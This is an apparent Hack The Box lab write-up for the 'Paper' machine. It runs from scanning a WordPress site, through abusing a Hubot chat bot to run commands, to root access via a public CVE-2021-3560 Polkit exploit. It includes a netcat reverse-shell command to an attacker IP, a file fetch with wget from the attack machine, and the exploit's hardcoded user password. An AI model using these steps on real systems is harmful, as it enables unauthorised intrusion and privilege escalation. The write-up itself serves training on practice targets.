# htb-writeup

# scan ip address
nmap -sC -sV {ip_address}

# check the open ports and see what can we discover further from it

# Get request to the URL
curl --head {ip_address}

# we get back some interesting information (office.paper)
we can add this information to out /etc/hosts file and visit the URL afterwards

# checking on the website we can see it runs WP, we can get a scan and check if there's anything exploitable
wpscan --url http://{ip_address}

# we discover that the used WP version is vulnerable 
checking the vulnerability we discover how to get to the secret/hidden page

# we add the new discovered page to /etc/hosts
once we're in we are able to start a chat we a 'bot' that can return some interesting things 

# the bot uses hubot which allows to insert custom scripts that can search for files in the directory
so we write in the chat 'list ../hubot/scripts'
afterwards we go to the file 'file ../hubot/scripts/files.js'
reading the .js file we discover we can run commands with 'run'

# on our attack machine we pop up a netcat listener
nc -nlvp {port}

# inside of the chat we run the command 
nc -e /bin/sh <attack_ip> {port}

# and we have a connection, listing the directories we find the one with the user flag!
for a more stable shell we run
python -c 'import pty;pty.spawn("/bin/bash")'

# next we want to check for some privesc, we can use linpeas.sh
to transfer it we start a webserver on out attack machine and from the target we can wget the file

# after transfering the file, we chmod it to be able to run it on the target machine

# with linpeas we discover some interesting files related to the rocket chat and a specific user, we can use that to login into the machine with ssh

# in order to further escalate and get our root flag, we search for an exploit.
I've used the following https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation", which enumerates and adds a user

# we run the poc.sh after we chmod it 
adds a user, we try to switch to that specific user using the password 'secnigmaftw' with 'su secnigma'

# in order to get root
we run 'sudo bash' and we insert the previous password we got for the newly added user

# we have root, check the directories and find the flag!
